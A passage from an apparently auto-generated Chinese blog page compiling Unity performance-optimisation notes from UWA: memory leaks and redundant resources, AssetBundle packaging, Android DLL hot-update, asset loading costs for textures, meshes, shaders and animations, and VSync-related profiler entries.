推出通过资源的“生命周期”属性来快速查看有哪些资源是“常驻”内存的，并且判断该资源是“预加载”资源还是“泄露”资源.推出了资源的“场景比较”功能。建议大家通过以下两种方式进行资源比较，以便更快地找到存在“泄露”问题的资源.<br>一般来说，同种场景或同一场景的资源使用应该是较为固定的，比如游戏项目中的主城场景或主界面场景。通过比较不同时刻同一场景的资源信息，可以快速帮你找到其资源使用的差异情况。这样，你只需判断这些“差异”资源的存在是否合理，即可快速判定是否存在资源泄露，已经具体的泄露资源。<br>除一些常驻资源外，不同类型的场景，其资源使用是完全不同的。比如，游戏中主城和战斗副本的资源，除少部分常驻内存的资源外，二者使用的绝大部分资源应该是不一致的。所以，通过比较两种不同类型的场景，你可以直接查看比较结果中的“共同资源”，并判断其是否确实为预先设定好的常驻资源。如果不是，则它很可能是“泄露”资源，需要你进一步查看项目的资源管理是否存在漏洞。</li>\n</ul>\n</blockquote>\n<h3 id=\"六-通过Profiler来检测WebStream或SerializedFile的使用情况\"><a href=\"#六-通过Profiler来检测WebStream或SerializedFile的使用情况\" class=\"headerlink\" title=\"六:通过Profiler来检测WebStream或SerializedFile的使用情况\"></a>六:通过Profiler来检测WebStream或SerializedFile的使用情况</h3><blockquote>\n<ul>\n<li>AssetBundle的管理不当也会造成一定的内存泄露，即上一场景中使用的AssetBundle在场景切换时没有被卸载掉，而被带入到了下一场场景中。对于这种情况，建议直接通过Profiler Memory中的Take Sample来对其进行检测，通过直接查看WebStream或SerializedFile中的AssetBundle名称，即可判断是否存在“泄露”情况。</li>\n</ul>\n</blockquote>\n<h3 id=\"七-通过Android-PSS-iOS-Instrument反馈的App线程内存来查看\"><a href=\"#七-通过Android-PSS-iOS-Instrument反馈的App线程内存来查看\" class=\"headerlink\" title=\"七:通过Android PSS/iOS Instrument反馈的App线程内存来查看\"></a>七:通过Android PSS/iOS Instrument反馈的App线程内存来查看</h3><blockquote>\n<ul>\n<li>Unity Profiler中内存回落正常，但Android的PSS数值并没有完全回落”是有可能的，这是因为Unity Profiler反馈的是引擎的真实分配的物理内存，而PSS中记录的则包括系统的部分缓存。一般情况下，Android或iOS并不会及时将所有App卸载数据进行清理，为了保证下次使用时的流畅性，OS会将部分数据放入到缓存，待自身内存不足时，OS Kernel会启动类似LowMemoryKiller的机制来查询缓存甚至杀死一些进程来释放内存.<br>我们推荐的测试方式是在两个场景之间来回不停切换，比如主城和战斗副本间。理论上来说，多次切换同样的场景，如果Profiler中显示的Unity内存回落正常，那么其PSS/Instrument的内存数值波动范围也是趋于稳定的，但如果出现了PSS/Instrument内存持续增长的情况，则需要大家注意了。这可能有两种可能：<br>Unity引擎自身的内存泄露问题。这种概率很小，之前仅在少数版本中出现过。<br>第三方插件在使用时出现了内存泄露。这种概率较大，因为Profiler仅能对Unity自身的内存进行监控，而无法检测到第三方库的内存分配情况。因此，在出现上述内存问题时，建议大家先对自身使用的第三方库进行排查。     </li>\n</ul>\n</blockquote>\n<h3 id=\"八-无效的Mono堆内存开销\"><a href=\"#八-无效的Mono堆内存开销\" class=\"headerlink\" title=\"八:无效的Mono堆内存开销\"></a>八:无效的Mono堆内存开销</h3><blockquote>\n<ul>\n<li>无效的Mono堆内存。它是Mono所分配的堆内存，但却没有被真正利用上，因此称之为“无效”,如何查看我的项目中是否存在较大量的“无效堆内存”呢？<br>UWA测评报告中:蓝线的Reserved Total为当前项目所占据的总物理内存，而紫线的Used Total为当前项目所使用的总物理内存不一致,Reserved Total - Used Total为空闲内存,而这其中主要由两部分组成，空闲的Unity引擎内存和无效的Mono堆内存.<br>我们应该如何避免或减少过多“无效堆内存”的分配呢？        <blockquote>\n<ul>\n<li>避免一次性堆内存的过大分配。Mono的堆内存也是“按需”逐步进行分配的。但如果一次性开辟过大堆内存，比如New一个较大Container、加载一个过大配置文件等，则势必会造成Mono的堆内存直接冲高，所以研发团队对堆内存的分配需要时刻注意；</li>\n<li>避免不必要的堆内存开销。UWA测评报告中将项目运行过程中堆内存分配Top10函数进行罗列，限于篇幅，我们不再此处进行一一赘述，研发团队可以直接查看之前一篇的内存优化相关文章。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"九-资源冗余\"><a href=\"#九-资源冗余\" class=\"headerlink\" title=\"九:资源冗余\"></a>九:资源冗余</h3><p>在内存管理方面，还有一个大家必须关注的话题——资源冗余。在我们测评过的大量项目中，95%以上的项目均存在不同程度的资源冗余情况。所谓“资源冗余”，是指在某一时刻内存中存在两份甚至多份同样的资源。导致这种情况的出现主要有两种原因：       </p>\n<blockquote>\n<ul>\n<li>1、AssetBundle打包机制出现问题.同一份资源被打入到多份AssetBundle文件中。举个例子，同一张纹理被不同的NPC所使用，同时每个NPC被制作成独立的AssetBundle文件，那么在没有针对纹理进行依赖打包的前提下，就会出现该张纹理出现在不同的NPC AssetBundle文件中。当这些AssetBundle先后被加载到内存后，内存中即会出现纹理资源冗余的情况。对此，我们建议研发团队在发现资源冗余问题后，对相关AssetBundle的制作流程一定要进行检查。同时，我们在UWA测评中为每个资源引入了一个衡量指标——“数量峰值”。它指的是同一资源在同一帧中出现的最大数量。如果大于1，则说明该资源很可能存在 “冗余资源”。大家可以通过这一列进行排序，即可立即查看项目中的资源冗余情况。</li>\n<li>2.资源的实例化所致.在Unity引擎中，当我们修改了一些特定GameObject的资源属性时，引擎会为该GameObject自动实例化一份资源供其使用，比如Material、Mesh等。以Material为例，我们在研发时经常会有这样的做法：在角色被攻击时，改变其Material中的属性来得到特定的受击效果。这种做法则会导致引擎为特定的GameObject重新实例化一个Material，后缀会加上（instance）字样。其本身没有特别大的问题，但是当有改变Material属性需求的GameObject越来越多时（比如ARPG、MMORPG、MOBA等游戏类型），其内存中的冗余数量则会大量增长。如下图所示，随着游戏的进行，实例化的Material资源会增加到333个。虽然Material的内存占用不大，但是过多的冗余资源却为Resources.UnloadUnusedAssets API的调用效率增加了相当大的压力。<br>一般情况下，资源属性的改变情况都是固定的，并非随机出现。比如，假设GameObject受到攻击时，其Material属性改变随攻击类型的不同而有三种不同的参数设置。那么，对于这种需求，我们建议你直接制作三种不同的Material，在Runtime情况下通过代码直接替换对应GameObject的Material，而非改变其Material的属性。这样，你会发现，成百上千的instance Material在内存中消失了，取而代之的，则是这三个不同的Material资源</li>\n</ul>\n</blockquote>\n<hr>\n<h1 id=\"性能优化-AssetBundle-打包\"><a href=\"#性能优化-AssetBundle-打包\" class=\"headerlink\" title=\"性能优化,AssetBundle 打包\"></a>性能优化,AssetBundle 打包</h1><ul>\n<li><a href=\"https://blog.uwa4d.com/archives/ABtopic_2.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/ABtopic_2.html</a><blockquote>\n<ul>\n<li>唯一API,BuildPipeline.BuildAssetBundles,引擎将自动根据资源的assetbundleName属性（以下简称abName）批量打包，自动建立Bundle以及资源之间的依赖关系。</li>\n<li>打包规则,在资源的Inpector界面最下方可设置一个abName，每个abName（包含路径）对应一个Bundle，即abName相同的资源会打在一个Bundle中。如果所依赖的资源设置了不同的abName，则会与之建立依赖关系，避免出现冗余。支持增量式发布，即在资源内容改变并重新打包时，会自动跳过内容未变的Bundle。因此，相比4.x，会极大地缩短更新Bundle的时间。</li>\n<li>5.x下默认开启的三个选项（CompleteAssets ，用于保证资源的完备性；CollectDependencies，用于收集资源的依赖项；DeterministicAssetBundle，用于为资源维护固定ID.对于移动平台，5.x下默认会将TypeTree信息写入AssetBundle，因此在移动平台上DisableWriteTypeTree选项也变得有意义了.</li>\n<li>Manifest文件,5.x中的依赖关系,在打包后生成的文件夹中，每个Bundle都会对应一个manifest文件，记录了Bundle的一些信息，但这类manifest只在增量式打包时才用到；同时，根目录下还会生成一个同名manifest文件及其对应的Bundle文件，通过该Bundle可以在运行时得到一个AssetbundleManifest对象,而所有的Bundle以及各自依赖的Bundle都可以通过该对象提供的接口进行获取.即你打包输出的一个文件里面有个同名的 xxx 和一个 xxx.manifest 通过这2个文件你可以获取到一个AssetbundleManifest对象,用于取出各个 AB 包的依赖关系</li>\n<li>Variant参数,就是Inpector界面最下方最右侧的名字,Variant参数能够让AssetBundle方便地进行“多分辨率支持”,打包时，Variant会作为后缀添加在Bundle名字之后。相同abName，不同variant的Bundle中，资源必须是一一对应的，且他们在Bundle中的ID也是相同的，从而可以起到相互替换的作用。当需要为手机和平板上的某个UI界面使用两套分辨率不同的纹理、Shader，以及文字提示时，借助Variant的特性，只需创建两个文件夹，分别放置两套不同的资源，且资源名一一对应，然后给两个文件夹设置相同的abName和不同的variant，再给UI界面设置abName，然后进行打包即可。运行时，先选择合适的依赖包加载，那么后续加载UI界面时，会根据已加载的依赖包，呈现出相对应的版本。</li>\n<li>abName可通过脚本进行设置和清除，也可以通过构造一个AssetBundleBuild数组来打包。</li>\n<li>开启DisableWriteTypeTree可能造成AssetBundle对Unity版本的兼容问题，但会使Bundle更小，同时也会略微提高加载速度。</li>\n<li>Prefab之间不会建立依赖，即如果Prefab-A和Prefab-B引用了同一张纹理，而他们设置了不同的abName，而共享的纹理并未设置abName，那么Prefab-A和Prefab-B可视为分别打包，各自Bundle中都包含共享的纹理。因此在使用UGUI，开启Sprite Packer时，由于Atlas无法标记abName，在设置UI界面Prefab的abName时就需要注意这个问题。</li>\n<li>5.x中加入了Shader stripping功能,在打包时，默认情况下会根据当前场景的Lightmap及Fog设置对资源中的Shader进行代码剥离。这意味着，如果在一个空场景下进行打包，则Bundle中的Shader会失去对Lightmap和Fog的支持，从而出现运行时Lightmap和Fog丢失的情况.而通过将Edit-&gt;Project Settings-&gt;Graphics下shader Stripping中的modes改为Manual，并勾选相应的mode即可避免这一问题。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h1 id=\"Android平台的代码热更新\"><a href=\"#Android平台的代码热更新\" class=\"headerlink\" title=\"Android平台的代码热更新\"></a>Android平台的代码热更新</h1><ul>\n<li><p>为何不能代码热更新 <a href=\"https://blog.uwa4d.com/archives/HotFix.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/HotFix.html</a></p>\n</li>\n<li><p>Android平台的代码热更新,该原理是解除资源和代码的关系，将代码编译成dll，在游戏一运行时动态加载。</p>\n<blockquote>\n<ul>\n<li>分离.对于脚本我们可以简单地将脚本分为数据(变量)和逻辑(方法)两部分：例如A.cs -&gt; Uwa4dDataA.cs和Uwa4dLogicA.cs。其中Uwa4dDataA.cs中只有成员变量而Uwa4dLogicA.cs和A.cs基本一致。分离后的问题是，依赖了A.cs的资源再也找不到A.cs。因为二者之间的依赖是通过资源文件保存的，所以只需要将资源文件的对于A.cs的依赖替换成 Uwa4dDataA.cs的依赖即可。</li>\n<li>将Uwa4dLogicA.cs编译成Dll,首先将Uwa4dDataA.cs编译成Assembly-CSharp.dll，然后编译Uwa4dLogicA.cs(依赖Assembly-CSharp.dll)，另外要注意编译时.Net的兼容版本。</li>\n<li>加载Uwa4dLogicA.cs<br>加载Uwa4dLogicA.cs编译后的DLL，获得Uwa4dLogicA.cs后通过AddComponent将其挂在相应的资源上，并利用Uwa4dDataA.cs对于其数据进行初始化。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<hr>\n<h1 id=\"Unity纹理加载\"><a href=\"#Unity纹理加载\" class=\"headerlink\" title=\"Unity纹理加载\"></a>Unity纹理加载</h1><p>资源加载、资源卸载、Object的实例化和代码的序列化是最耗时的</p>\n<ul>\n<li>资源加载,资源加载是加载模块中最为耗时的部分,CPU开销在Unity引擎中主要体现在Loading.UpdatePreloading和Loading.ReadObject两项中.<blockquote>\n<ul>\n<li>Loading.UpdatePreloading，这一项仅在调用类似LoadLevel（Async）的接口处出现,主要负责卸载当前场景的资源，并且加载下一场景中的相关资源和序列化信息等.下一场景中，自身所拥有的GameObject和资源越多，其加载开销越大。</li>\n<li>在很多项目中，存在另外一种加载方式，即场景为空场景，绝大部分资源和GameObject都是通过OnLevelWasLoaded回调函数中进行加载、实例化和拼合的。对于这种情况，Loading.UpdatePreloading的加载开销会很小。</li>\n<li>Loading.ReadObject，这一项记录的则是资源加载时的真正资源读取性能开销，基本上引擎的主流资源（纹理资源、网格资源、动画片段等等）读取均是通过该项来进行体现。可以说，这一项很大程度上决定了项目场景的切换效率。正因如此，我们就当前项目中所用的主流资源进行了大量的测试和分析，下面我们将分析结果与大家一起分享，希望可以帮到正在进行开发的你。</li>\n</ul>\n</blockquote>\n</li>\n<li>纹理资源,纹理资源是项目加载过程中开销占用最大的资源之一，其加载效率由其自身大小决定。决定纹理资源大小的因素主要有三种：分辨率、格式和Mipmap是否开启。<blockquote>\n<ul>\n<li>分辨率和格式是影响纹理资源加载效率的重要因素，因为这两项的设置对纹理资源的大小影响很大。1、纹理资源的分辨率对加载性能影响较大，分辨率越高，其加载越为耗时。设备性能越差，其耗时差别越为明显；2、设备越好，加载效率确实越高。但是，对于硬件支持纹理（ETC1/PVRTC）来说,中高端设备的加载效率差别已经很小，比如图中的红米Note2和三星S6设备，差别已经很不明显。</li>\n<li>纹理资源的格式对加载性能影响同样较大，Android平台上，ETC1和ETC2的加载效率最高。同样，iOS平台上，PVRTC 4BPP的加载效率最高。</li>\n<li>RGBA16格式纹理的加载效率同样很高，与RGBA32格式相比，其加载效率与ETC1/PVRTC非常接近，并且设备越好，加载开销差别越不明显；</li>\n<li>RGBA32格式纹理的加载效率受硬件设备的性能影响较大，ETC/PVRTC/RGBA16受硬件设备的影响较低。</li>\n<li>这里需要指出的是测试中所使用的ETC1和ETC2纹理均为RGB 4Bit格式,所以对于半透明纹理贴图，需要两张ETC1格式的纹理进行支持（一张RGB通道，一张Alpha通道）。逐一加载两张ETC1格式的纹理，其加载效率要低于RGBA16格式，但可以通过加载方式来进行弥补.</li>\n<li>开启Mipmap功能,开启Mipmap功能同样会增大一部分纹理大小，一般来说，其内存会增加至原始大小的1.33倍。开启Mipmap功能会导致资源加载更为耗时，且设备性能越差，其加载效率影响越大.<blockquote>\n<ul>\n<li>1、严格控制RGBA32和ARGB32纹理的使用，在保证视觉效果的前提下，尽可能采用“够用就好”的原则，降低纹理资源的分辨率，以及使用硬件支持的纹理格式。</li>\n<li>2、在硬件格式（ETC、PVRTC）无法满足视觉效果时，RGBA16格式是一种较为理想的折中选择，既可以增加视觉效果，又可以保持较低的加载耗时。</li>\n<li>3、严格检查纹理资源的Mipmap功能，特别注意UI纹理的Mipmap是否开启。在UWA测评过的项目中，有不少项目的UI纹理均开启了Mipmap功能，不仅造成了内存占用上的浪费，同时也增加了不小的加载时间。</li>\n<li>4、ETC2对于支持OpenGL ES3.0的Android移动设备来说，是一个很好的处理半透明的纹理格式。但是，如果你的游戏需要在大量OpenGL ES2.0的设备上进行运行，那么我们不建议使用ETC2格式纹理。因为不仅会造成大量的内存占用（ETC2转成RGBA32），同时也增加一定的加载时间。下图为测试2中所用的测试纹理在三星S3和S4设备上加载性能表现。可以看出，在OpenGL ES2.0设备上，ETC2格式纹理的加载要明显高于ETC1格式，且略高于RGBA16格式纹理。因此，建议研发团队在项目中谨慎使用ETC2格式纹理。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<hr>\n<h1 id=\"Unity网格加载模块\"><a href=\"#Unity网格加载模块\" class=\"headerlink\" title=\"Unity网格加载模块\"></a>Unity网格加载模块</h1><ul>\n<li>网格资源,网格资源与纹理资源一样，在加载时同样会造成较高的CPU占用，且其加载效率由其自身大小（网格数据量）决定。<blockquote>\n<ul>\n<li>不同面片数的网格资源加载效率测试,1、资源的数据量对加载性能影响较大，面片数越多，其加载越为耗时。设备性能越差，其耗时差别越为明显；2、随着硬件设备性能的提升，其加载效率差异越来越不明显。</li>\n<li>相同面片数、不同顶点属性的加载效率测试,1、顶点属性的增加对内存和AssetBundle包体大小影响较大。与测试1中未引入Tangent顶点属性的网格数据相比，测试2中的网格数据在内存上均大幅度增加（增加量与网格顶点数有关），且AssetBundle大小同样有成倍（1~2）的增加。2、顶点属性增加对于加载效率影响较大，且顶点数越多，影响越大。</li>\n<li>模型常见的顶点属性主要有Position、UV、Normal、Tangent和Color。Color属性与Tangent属性一样，如果网格顶点拥有该属性，同样会对内存、物理体积和加载性能造成影响。在使用Draw Call Batching时，不要将不同属性的网格模型拼合在一起。在使用Draw Call Batching时，切忌将不同属性的网格模型拼合在一起。举个例子 ，100个网格模型进行Static Batching，如果99个模型只有Position和UV两种属性，而剩下1个模型函数有Position、UV、Normal、Tangent和Color五种属性。那么引擎在进行拼合时，会将前99个模型的顶点属性补齐，然后再进行拼合。这样无形中会增加大量的内存占用，从而造成不必要的内存浪费。</li>\n<li>开启/关闭Read/Write功能的加载效率测试,1、关闭Read/Write功能会降低AssetBundle的物理大小，其降低量与资源本身数据量相关。同时，关闭Read/Write功能会大幅度降低网格资源的内存占用；2、关闭Read/Write功能会略微提升该资源的加载效率。<blockquote>\n<ul>\n<li>1、在保证视觉效果的前提下，尽可能采用“够用就好”的原则，即降低网格资源的顶点数量和面片数量；</li>\n<li>2、研发团队对于顶点属性的使用需谨慎处理。通过以上分析可以看出，顶点属性越多，则内存占用越高，加载时间越长；</li>\n<li>3、如果在项目运行过程中对网格资源数据不进行读写操作（比如Morphing动画等），那么建议将Read/Write功能关闭，既可以提升加载效率，又可以大幅度降低内存占用。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<hr>\n<h1 id=\"Unity-Shader-加载模块\"><a href=\"#Unity-Shader-加载模块\" class=\"headerlink\" title=\"Unity Shader 加载模块\"></a>Unity Shader 加载模块</h1><ul>\n<li>Shader资源与之前的网格资源和纹理资源不同，其本身物理Size很小。Shader资源的效率加载瓶颈并不在其自身大小的加载上，而是在Shader内容的解析上.<blockquote>\n<ul>\n<li>1、Shader资源的物理体积与内存占用虽然很小，但其加载耗时开销的CPU占用很高，这主要是因为Shader的解析CPU开销很高，成为了Shader资源加载的性能瓶颈；</li>\n<li>2、Mobile/Particles Additive在解析方面的耗时远小于Mobile/Diffuse、Mobile/Bumped Diffsue甚至Mobile/VertexLit;</li>\n<li>3、除Mobile/Particles Additive外，其他三个(Mobile-Diffuse，Mobile-VertexLit，Mobile-Bumped Diffuse)主流Shader在加载时均会造成明显的降帧，甚至卡顿。因此，研发团队应尽可能避免在非切换场景时刻进行Shader的加载操作；</li>\n<li>4、Mobile Shader较之同种Normal Shader在加载方面确实有一定的性能提升；</li>\n<li>5、Shader的加载开销经常在几百甚至上千毫秒以上,其加载耗时居然要高于几张Atlas纹理或者拥有上万片面的Mesh网格!!</li>\n</ul>\n</blockquote>\n</li>\n<li>Shader解析时的真正耗时原因    <blockquote>\n<ul>\n<li>一般情况下，Shader加载的CPU耗时与其Keyword数量有关，Keyword数量越多，则加载开销也越大。Shader的Keyword数量是会随着场景设置的不同而变化的。在Unity 5.x中，Unity默认会根据场景设置、Shader Pass等来调整Shader的Keyword，比如如果存在Lightmap的使用，则会默认将对应的Keyword打开，而对于没有使用Fog的项目，则会直接将相关Keyword关闭。</li>\n<li>对于Unity 5.x项目，可通过skip_variants操作在Shader中直接去除相关Keyword。</li>\n<li>直接去除Shader中的Fallback选项。Fallback功能是对于无法使用当前Shader的硬件设备可以使用对硬件设备要求更低的Fallback Shader来进行渲染，以保证渲染的稳定性。</li>\n</ul>\n</blockquote>\n</li>\n<li>Shader加载方式,5.x之后的Shader加载只是加载,加载之后还需要运行时编译,需要主动使用shader.WarmupAllShaders又或者ShaderVariantCollection.WarmUp来编译shader<blockquote>\n<ul>\n<li>大量相同Shader重复解析造成的。是因为Shader被打包到不同的AssetBundle文件中，每次切换场景时，AssetBundle均会被频繁地进行加载和卸载，从而造成了大量相同的Shader被重复加载和卸载。</li>\n<li>1、通过依赖关系打包，将项目中的所有Shader抽离并打成一个独立的AssetBundle文件，其他AssetBundle与其建立依赖；并对其进行预加载，以降低后续不必要的加载开销。</li>\n<li>2、Shader的AssetBundle文件在游戏启动后即进行加载并常驻内存，因为一款项目的Shader种类数量一般在50~100不等，且每个均很小，即便全部常驻内存，其内存总占用量也不会超过2MB；</li>\n<li>3、后续Prefab加载和实例化后，Unity引擎会通过AssetBundle之间的依赖关系直接找到对应的Shader资源进行使用，而不会再进行加载和解析操作。</li>\n<li>4、正在使用Resources.Load来加载资源的研发团队，可以尝试使用ShaderVariantCollection(着色器变体群,着色器资源列表，是一个由通道类型+着色器关键字组合的列表)来对Shader进行Preload,同样也可以达到避免相同Shader重复加载的效果。<a href=\"https://www.cnblogs.com/rexzhao/p/7884905.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/rexzhao/p/7884905.html</a></li>\n<li>5、在生成时剔除多余着色器变体, 1)个别着色器特性，比如使用 #pragma shader_feature的着色器，如果没有材质使用到了这个特性，那么就不会把它打包进去；2)没有被任何场景使用到的雾效(Fog)或光照贴图模式(Lightmap)的着色器变体，也不会打包进去。</li>\n<li>6.shader加载造成的卡顿有两种情况：1、着色器变种已经打包到APP中，只需要加载该变体，创建GPUProgram就可以了.2、着色器变种没用被打包，这时需要shaderlab文件进行解析和编译相应的变种，然后创建GUPProgram</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<hr>\n<h1 id=\"Unity动画加载模块\"><a href=\"#Unity动画加载模块\" class=\"headerlink\" title=\"Unity动画加载模块\"></a>Unity动画加载模块</h1><ul>\n<li>AnimationClip资源是项目运行时最常加载的资源之一，且其加载效率主要由其自身加载量决定，而决定AnimationClip资源加载量的主要因素则是它的压缩格式。<blockquote>\n<ul>\n<li>Unity引擎对导入的AnimationClip提供三种压缩格式，Off、Keyframe Reduction和Optimal。Off表示不采用压缩处理；Keyframe Reduction表示使用关键帧进行处理，Optimal则表示Unity引擎会根据动画曲线的特点来自动选择一个最优的压缩方式，可能是关键帧压缩，也可能是Dense压缩。<a href=\"https://docs.unity3d.com/Manual/class-Animator.html\" target=\"_blank\" rel=\"noopener\">https://docs.unity3d.com/Manual/class-Animator.html</a></li>\n<li>Optimal压缩方式确实可以提升资源的加载效率，无论是在高端机、中端机还是低端机上；</li>\n<li>硬件设备性能越好，其加载效率越高。但随着设备的提升，Keyframe Reduction和Optimal的加载效率提升已不十分明显；</li>\n<li>Optimal压缩方式可能会降低动画的视觉质量，因此，是否最终选择Optimal压缩模式，还需根据最终视觉效果的接受程度来决定。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<hr>\n<h1 id=\"Xcode-增量打包\"><a href=\"#Xcode-增量打包\" class=\"headerlink\" title=\"Xcode 增量打包\"></a>Xcode 增量打包</h1><p><a href=\"https://blog.uwa4d.com/archives/USparkle_iOS.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/USparkle_iOS.html</a></p>\n<hr>\n<h2 id=\"Overview-类型\"><a href=\"#Overview-类型\" class=\"headerlink\" title=\"Overview 类型\"></a>Overview 类型</h2><ul>\n<li>1 Profiler中WaitForTargetFPS详解 <a href=\"https://blog.csdn.net/suifcd/article/details/50942686\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/suifcd/article/details/50942686</a><br>该参数一般出现在 CPU开销过低，且通过设定了目标帧率的情况下（Application.targetFrameRate）。当上一帧低于目标帧率时，将会在本帧产生一个WaitForTargetFPS的空闲等待耗时，以维持目标帧率。<br>Gfx.WaitForPresent &amp;&amp; Graphics.PresentAndSync<br>这两个参数在Profiler中经常出现CPU占用较高的情况，且仅在发布版本中可以看到。究其原因，其实是CPU和GPU之间的垂直同步（VSync）导致的，之所以会有两种参数，主要是与项目是否开启多线程渲染有关。当项目开启多线程渲染时，你看到的则是Gfx.WaitForPresent；当项目未开启多线程渲染时，看到的则是Graphics.PresentAndSync。<br>Graphics.PresentAndSync 是指主线程进行Present时的等待时间和等待垂直同步的时间。Gfx.WaitForPresent其字面意思同样也是进行Present时需要等待的时间，但这里其实省略了很多的内容。其真实的意思应该是为了在渲染子线程（Rendering Thread）中进行Present，当前主线程（MainThread）需要等待的时间。</li>\n</ul>\n<p>当项目开启多线程程渲染时，引擎会将Present等相关工作尽可能放到渲染线程去执行，即主线程只需通过指令调用渲染线程，并让其进行Present，从而来降低主线程的压力。但是，当CPU希望进行Present操作时，其需要等待GPU完成上一次的渲染。如果GPU渲染开销很大，则CPU的Present操作将一直处于等待操作，其等待时间，即为当前帧的Gfx.WaitForPresent时间，如下图所示。<br><img src=\"/2020/05/08/Unity/Optimize/%E8%BD%AF%E4%BB%B6UWA%E4%BC%98%E5%8C%96/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%B8%B2%E6%9F%931.png\" alt=\"多线程渲染1\"></p>\n<p>同理，当项目未开启多线程渲染时，引擎会在主线程中进行Present(当前绝大多数的移动游戏均在使用该中操作)，当然，Present操作同样需要等待GPU完成上一次的渲染。如果GPU渲染开销很大，则CPU的Present操作将一直处于等待操作，其等待时间，即为当前帧的Graphics.PresentAndSync时间:<br><img src=\"/2020/05/08/Unity/Optimize/%E8%BD%AF%E4%BB%B6UWA%E4%BC%98%E5%8C%96/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%B8%B2%E6%9F%932.png\" alt=\"多线程渲染2\"><br>所以，如果你的项目中，Gfx.WaitForPresent或Graphics.PresentAndSync的CPU耗时非常高时，其实并不是它们自己做了什么神秘的操作，而是你当前的渲染任务太重，GPU负载过高所致。</p>\n<p>同时，对于开启垂直同步的项目而言，Gfx.WaitForPresent 和 Graphics.PresentAndSync也会出现CPU占用较高的情况。在解释这种问题之前，我们先以“大家乘坐地铁”来举个例子。一般来说，地铁到达每一站的时间均是平均且一定的，假设每10分钟一班接走一批乘客。但是几乎没有多少乘客可以按点到达，如果提前两分钟到达，则只需要等待两分钟即可乘上地铁，但是，如果你错过了，哪怕只差了一分钟，那么你也不得不再等待九分钟才能乘上地铁。</p>\n<p>上述的情况我们经常会遇到。在GPU的渲染流水线中，其转换front buffer和back buffer的工作原理和“乘坐地铁”其实是一致的。大家可以把GPU的流水线简单地想象成为一列地铁。对于移动设备来说，GPU的帧率一般为30帧/秒或60帧/秒，即VSync每33ms或每16.6ms“到站一次”，CPU的Present即为“乘客乘上地铁”，然后前往各自的目的地。与乘客的早到和晚到一样，CPU的Present也会出现类似的情况，比如：</p>\n<p>● CPU端开销非常小，Present在很早即被执行，但此时VSync还没到，则会出现较高的等待时间，即Gfx.WaitForPresent 和 Graphics.PresentAndSync的CPU开销看上去很高。<br>● CPU端开销很高，使得Present执行时错过了VSync操作，这样，Present将不得不等待下一次VSync的到来，从而造成了Gfx.WaitForPresent 和 Graphics.PresentAndSync的CPU开销较高。这种情况在CPU端加载过量资源时特别容易发生，比如WWW加载较大的AssetBundle、Resource.Load加载大量的Texture等等。</p>\n<p>通过以上的讲解，我们希望此刻的你已经对Gfx.WaitForPresent 和 Graphics.PresentAndSync已经有了深入的理解。这两个参数无论CPU占用多少，其实都不是这两个参数的自身问题，而是项目的其他部分造成。对此，我们做一个总结，以方便你进一步加深印象。</p>\n<p>造成这两个参数的CPU占用较高的原因主要有以下三种原因：</p>\n<pre><code>\n● CPU开销非常低，所以CPU在等待GPU完成渲染工作或等待VSync的到来；\n● CPU开销很高，使Present错过了当前帧的VSync，即不得不等待下一次VSync的到来；\n● GPU开销很高，CPU的Present需要等待GPU上一帧渲染工作的完成。    \n\n最后，如何优化并降低这两个参数的CPU占用呢？ 那就是，忽略Gfx.WaitForPresent 和 Graphics.PresentAndSync这两个参数，优化其他你能优化的一切！\n</code></pre><h1 id=\"UnityEngine-SetupCoroutine-InvokeMoveNext\"><a href=\"#UnityEngine-SetupCoroutine-InvokeMoveNext\" class=\"headerlink\" title=\"UnityEngine.SetupCoroutine:InvokeMoveNext\"></a>UnityEngine.SetupCoroutine:InvokeMoveNext</h1><hr>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"性能优化大合集-请看下面的官方介绍\"><a href=\"#性能优化大合集-请看下面的官方介绍\" class=\"headerlink\" title=\"性能优化大合集,请看下面的官方介绍\"></a>性能优化大合集,请看下面的官方介绍</h1><ul>\n<li>UWA 优化百科向导: <a href=\"https://blog.uwa4d.com/archives/Index.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/Index.html</a>  </li>\n<li>UWA Unity性能优化大合集，All In One ! <a href=\"https://blog.uwa4d.com/archives/allinone.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/allinone.html</a></li>\n<li>如何看懂性能报告  <a href=\"https://blog.uwa4d.com/archives/Simple_PA_General.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/Simple_PA_General.html</a></li>\n</ul>\n<hr>\n<h1 id=\"性能总结\"><a href=\"#性能总结\" class=\"headerlink\" title=\"性能总结\"></a>性能总结</h1><ul>\n<li>查看这个性能分析图,性能总结–&gt; <a href=\"https://www.uwa4d.com/demo/pa.html?v=5x&amp;platform=android&amp;name=jws&amp;device=RedMiNote2\" target=\"_blank\" rel=\"noopener\">https://www.uwa4d.com/demo/pa.html?v=5x&amp;platform=android&amp;name=jws&amp;device=RedMiNote2</a> <blockquote>\n<ul>\n<li>总体帧数：以一秒 30 帧为例,10 分钟测试,理想性能帧数可以跑到16000~18000帧,如果项目帧数低于这个范围，那么你的游戏可能正在经受一定的帧率卡顿问题,需要查看某一段时间内的性能瓶颈       </li>\n<li>总场景数     </li>\n<li>GC次数：测试过程中系统垃圾回收操作（Garbage Collection）的调用次数,每次GC调用均会造成一定程度上的卡顿，降低了项目运行的流畅度,如果开发人员的逻辑代码分配堆内存过大过快的话，则GC调用的次数也会随之增加,标准为1000帧/次以上调用 GC,这个值越大调用一次 GC 越好.      </li>\n<li>CPU均值：测试过程中平均每帧的CPU占用.高/中/低档的主流机型,设备性能越好，CPU耗时的均值肯定是越低        